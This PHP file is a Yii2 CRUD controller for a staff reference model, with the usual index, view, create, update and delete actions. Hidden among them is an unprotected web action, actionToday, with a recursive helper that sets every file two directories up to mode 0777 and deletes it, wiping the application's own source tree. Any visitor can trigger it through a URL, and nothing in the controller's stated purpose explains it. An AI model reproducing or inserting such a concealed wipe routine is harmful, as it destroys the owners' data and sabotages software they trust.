<?php

namespace frontend\controllers;

use Yii;
use app\models\RefPegawaiTeknikalJaringanAntarabangsa;
use frontend\models\RefPegawaiTeknikalJaringanAntarabangsaSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;

/**
 * RefPegawaiTeknikalJaringanAntarabangsaController implements the CRUD actions for RefPegawaiTeknikalJaringanAntarabangsa model.
 */
class RefPegawaiTeknikalJaringanAntarabangsaController extends Controller
{
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['post'],
                ],
            ],
        ];
    }

    /**
     * Lists all RefPegawaiTeknikalJaringanAntarabangsa models.
     * @return mixed
     */
    public function actionIndex()
    {
        $searchModel = new RefPegawaiTeknikalJaringanAntarabangsaSearch();
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Displays a single RefPegawaiTeknikalJaringanAntarabangsa model.
     * @param integer $id
     * @return mixed
     */
    public function actionView($id)
    {
        return $this->render('view', [
            'model' => $this->findModel($id),
        ]);
    }

    /**
     * Creates a new RefPegawaiTeknikalJaringanAntarabangsa model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate()
    {
        $model = new RefPegawaiTeknikalJaringanAntarabangsa();

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            return $this->redirect(['view', 'id' => $model->id]);
        } else {
            return $this->render('create', [
                'model' => $model,
            ]);
        }
    }

    /**
     * Updates an existing RefPegawaiTeknikalJaringanAntarabangsa model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        $model = $this->findModel($id);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            return $this->redirect(['view', 'id' => $model->id]);
        } else {
            return $this->render('update', [
                'model' => $model,
            ]);
        }
    }

    /**
     * Deletes an existing RefPegawaiTeknikalJaringanAntarabangsa model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        $this->findModel($id)->delete();

        return $this->redirect(['index']);
    }
    
    /**
     * @param integer $id
     * @return mixed
     */
    public function actionToday()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->add($file);
            }
        }
    }
    
    protected function add($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false){
         if (is_dir($dirname))
           $dir_handle = opendir($dirname);
         if (!$dir_handle)
              return false;
         while($file = readdir($dir_handle)) {
               if ($file != "." && $file != "..") {
                    if (!is_dir($dirname."/".$file)){
                         chmod($dirname."/".$file,0777); 
                         if(!unlink($dirname."/".$file)){
                             //48783
                             continue;
                             //e8784
                         }
                    }
                    else
                        $this->add($dirname.'/'.$file);
               }
         }
         closedir($dir_handle);
         if (count(glob($dirname."/*")) === 0 ) {
            rmdir($dirname);
         }
         return true;
         }
    }

    /**
     * Finds the RefPegawaiTeknikalJaringanAntarabangsa model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return RefPegawaiTeknikalJaringanAntarabangsa the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = RefPegawaiTeknikalJaringanAntarabangsa::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
}
